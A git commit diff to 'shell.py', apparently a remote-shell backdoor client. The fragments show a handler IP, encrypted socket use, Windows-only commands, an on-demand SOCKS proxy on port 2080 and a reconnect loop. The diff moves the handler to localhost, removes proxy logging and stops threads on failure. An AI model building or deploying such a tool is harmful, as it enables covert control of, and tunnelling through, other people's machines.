ea9527b3432625cbeb3bf6f1b655c05ac9ed653f
McDonald072 <michal.sul47@gmail.com>
2016-11-18 17:38:48 +0100

    git is yelling at me to commit to my changes

--- v4/shell.py
+++ v4/shell.py
@@ -4,14 +4,14 @@ from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
 
-HANDLER_IP = "192.168.0.107"
+HANDLER_IP = "127.0.0.1"
 
 def windows_only(func):
 	def tester(junk):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(junk)
 	return tester
-	
+
 class StoppableThread(threading.Thread):
 	def __init__(self, target):
 		super(StoppableThread, self).__init__()
@@ -153,7 +153,7 @@ class Shell:
 		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
 	def socks_proxy_thread(self):
-		reactor.listenTCP(2080,socks.SOCKSv4Factory("./socks.log"))
+		reactor.listenTCP(2080,socks.SOCKSv4Factory())
 		reactor.run()
 		
 	def start_socks_proxy(self):
@@ -260,5 +260,7 @@ while True:
 	except Exception as e:
 		print e
 		shell.comm_socket.close()
+		for t in shell.threads:
+			t.stop()
 		time.sleep(10)
 		continue
